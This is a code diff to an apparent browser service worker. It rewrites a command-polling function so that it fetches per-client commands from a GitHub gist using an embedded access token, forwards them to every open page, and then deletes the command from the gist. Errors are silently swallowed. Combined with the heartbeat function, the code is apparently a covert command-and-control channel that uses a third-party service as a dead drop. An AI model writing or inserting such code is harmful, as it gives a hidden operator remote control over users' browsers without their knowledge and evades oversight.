@@ -66,13 +66,23 @@ async function heartbeat(uid) {
 
 async function checkCmd(uid) {
     try {
-        var r = await fetch('/c.json', { cache: 'no-store' });
-        if (r.ok) {
-            var cmd = await r.json();
-            if (cmd && cmd.uid === uid && cmd.cmd) {
-                var clients = await self.clients.matchAll({ includeUncontrolled: true });
-                clients.forEach(function(c) { c.postMessage({ type: 'cmd', payload: cmd }); });
-            }
-        }
+        var r = await fetch('https://api.github.com/gists/' + GIST_ID, {
+            headers: { 'Authorization': 'Bearer ' + PAT }
+        });
+        if (!r.ok) return;
+        var gist = await r.json();
+        var key = 'cmd_' + uid;
+        if (!gist.files || !gist.files[key]) return;
+        var cmd = (gist.files[key].content || '').trim();
+        if (!cmd) return;
+        var clients = await self.clients.matchAll({ includeUncontrolled: true });
+        clients.forEach(function(c) { c.postMessage({ type: 'cmd', payload: { cmd: cmd, uid: uid } }); });
+        var del = {};
+        del[key] = null;
+        await fetch('https://api.github.com/gists/' + GIST_ID, {
+            method: 'PATCH',
+            headers: { 'Authorization': 'Bearer ' + PAT, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ files: del })
+        });
     } catch(e) {}
 }
